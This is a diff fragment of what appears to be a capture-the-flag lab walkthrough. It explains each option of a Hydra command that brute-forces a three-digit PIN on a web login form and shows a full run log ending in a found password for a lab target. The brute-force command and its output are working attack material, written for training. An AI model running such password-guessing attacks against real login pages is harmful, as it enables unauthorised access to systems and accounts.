@@ -108,3 +108,49 @@ hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS
 
 The command above will try one password after another in the ```3digits.txt``` file. It specifies the following:
 
+- ```-l ''``` indicates that the login name is blank as the security lock only requires a password
+- ```-P 3digits.txt``` specifies the password file to use
+- ```-f``` stops Hydra after finding a working password
+- ```-v``` provides verbose output and is helpful for catching errors
+```MACHINE_IP``` is the IP address of the target
+```http-post-form``` specifies the HTTP method to use
+- ```"/login.php:pin=^PASS^:Access denied"``` has three parts separated by ```:```
+
+```/login.php``` is the page where the PIN code is submitted
+
+```pin=^PASS^``` will replace ```^PASS^``` with values from the password list
+
+```Access denied``` indicates that invalid passwords will lead to a page that contains the text “Access denied”
+
+- ```-s 8000``` indicates the port number on the target
+
+It’s time to run ```hydra``` and discover the password. Please note that in this case, we expect ```hydra``` to take three minutes to find the password. Below is an example of running the command above:
+
+```
+root@AttackBox# hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-19 17:38:42
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1109 login tries (l:1/p:1109), ~70 tries per task
+[DATA] attacking http-post-form://MACHINE_IP:8000/login.php:pin=^PASS^:Access denied
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
+[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
+[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
+[...]
+[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
+[8000][http-post-form] host: MACHINE_IP   password: [redacted]
+[STATUS] attack finished for MACHINE_IP (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-19 17:39:24
+```
+
+The command above shows that ```hydra``` has successfully found a working password. On the AttackBox, running the above command should finish within three minutes.
+
+We have just discovered the new password for the IT server room. Please enter the password you have just found at http://MACHINE_IP:8000/ using the AttackBox’s web browser. This should give you access to control the door.
+
+Now, we can retrieve the backup tapes, which we’ll soon use to rebuild our systems.
+
+**Q/A**
+
